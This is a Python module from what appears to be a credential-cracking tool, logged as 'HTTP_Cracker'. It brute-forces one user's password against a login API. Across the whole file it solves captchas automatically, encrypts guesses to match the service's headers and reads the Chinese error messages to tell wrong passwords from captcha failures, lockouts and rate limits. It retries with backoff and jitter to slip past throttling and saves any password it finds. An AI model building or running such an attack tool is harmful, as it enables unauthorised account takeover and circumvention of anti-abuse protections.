import logging
import random
import time

import requests

from src.config import LOGIN_API
from src.core.database import save_success
from src.utils.captcha import solve_captcha
from src.utils.crypto import encrypt_aes, generate_headers

logger = logging.getLogger("HTTP_Cracker")

# Constants
MAX_RETRIES = 15  # Max attempts per password before giving up
BASE_BACKOFF = 1.0  # Initial sleep time for network errors
MAX_BACKOFF = 20.0  # Max sleep time for network errors


def check_login(sess, username, password):
    """
    Attempt a single login via HTTP.
    Returns:
      'SUCCESS': Login successful
      'FAIL_PASS': Password incorrect
      'FAIL_CAPTCHA': Captcha incorrect (should retry)
      'FAIL_LOCK': Account locked
      'FAIL_RATE_LIMIT': Server returning 429 or 'frequent'
      'ERROR': Network/Unknown error
    """
    try:
        # 1. Get Captcha
        cid, code = solve_captcha(sess)
        if not cid or not code:
            logger.warning("Captcha solution failed (empty cid/code)")
            return "ERROR"

        # 2. Prepare headers with encryption
        headers = generate_headers("GET")
        headers["username"] = encrypt_aes(username)
        headers["password"] = encrypt_aes(password)

        # 3. Send Login Request
        # Note: Query params for captcha
        params = {"captchaId": cid, "answer": code}

        resp = sess.get(LOGIN_API, headers=headers, params=params, timeout=8)

        # 4. Analyze Response
        if resp.status_code == 429:
            return "FAIL_RATE_LIMIT"

        if resp.status_code == 200:
            data = resp.json()
            status = data.get("status")
            # Ensure message is a string even if None in JSON
            message = data.get("message") or ""
            # Ensure data_content is a dict even if None in JSON
            data_content = data.get("data") or {}

            # Case: Success
            if status == "success" or "token" in data_content:
                return "SUCCESS"

            # Case: Failure
            if "验证码" in message:
                return "FAIL_CAPTCHA"
            elif "密码" in message or "账号" in message or "非法" in message:
                return "FAIL_PASS"
            elif "锁定" in message:
                return "FAIL_LOCK"
            elif "频繁" in message or "limit" in message.lower():
                return "FAIL_RATE_LIMIT"
            else:
                logger.warning(f"Unknown response: {message}")
                # Default to FAIL_PASS on unknown error to avoid stalling,
                # but valid responses usually fall in categories above.
                return "FAIL_PASS"

        else:
            logger.warning(f"HTTP Status {resp.status_code}")
            return "ERROR"

    except Exception as e:
        logger.warning(f"Request exception: {e}")
        return "ERROR"


def worker(stop_event, progress_queue, username, password, day_prefix):
    """
    Thread worker to attempt one password.
    Loops internally for captcha retries and transient errors.
    """
    if stop_event.is_set():
        return

    sess = requests.Session()

    retry_count = 0
    consecutive_net_errors = 0

    while retry_count < MAX_RETRIES:
        if stop_event.is_set():
            return

        result = check_login(sess, username, password)

        if result == "SUCCESS":
            logger.info(f"✅ FOUND PASSWORD: {password}")
            save_success(username, password)
            stop_event.set()
            return

        elif result == "FAIL_PASS":
            # Normal failure, queue progress update
            progress_queue.put((username, day_prefix, password))
            return

        elif result == "FAIL_LOCK":
            logger.critical("🚨 Account LOCKED. Stopping all threads.")
            stop_event.set()
            return

        elif result == "FAIL_CAPTCHA":
            # Retry immediately with same password
            retry_count += 1
            if retry_count % 5 == 0:
                logger.warning(f"⚠️ Captcha failed {retry_count} times for {password}")

            # Reset net errors since we got a valid response (even if captcha wrong)
            consecutive_net_errors = 0
            # Small sleep to be polite
            time.sleep(0.2)
            continue

        elif result == "FAIL_RATE_LIMIT":
            logger.warning(f"⚠️ Rate limited on {password}. Backing off...")
            retry_count += 1
            consecutive_net_errors += 1

            # Significant sleep for rate limiting
            sleep_time = 5.0 + (consecutive_net_errors * 2.0) + random.random()
            time.sleep(min(sleep_time, 30.0))
            continue

        elif result == "ERROR":
            # Network error, sleep with exponential backoff
            retry_count += 1
            consecutive_net_errors += 1

            if retry_count % 5 == 0:
                logger.warning(f"⚠️ Network error {retry_count} times for {password}")

            sleep_time = min(BASE_BACKOFF * (1.5**consecutive_net_errors), MAX_BACKOFF)
            # Add jitter
            sleep_time += random.random()

            time.sleep(sleep_time)
            continue

    # If we fall through here, we exceeded MAX_RETRIES
    logger.error(f"❌ Worker gave up on {password} after {MAX_RETRIES} retries.")
    # Do NOT update progress, so this password remains 'untried' in a future run.
    return
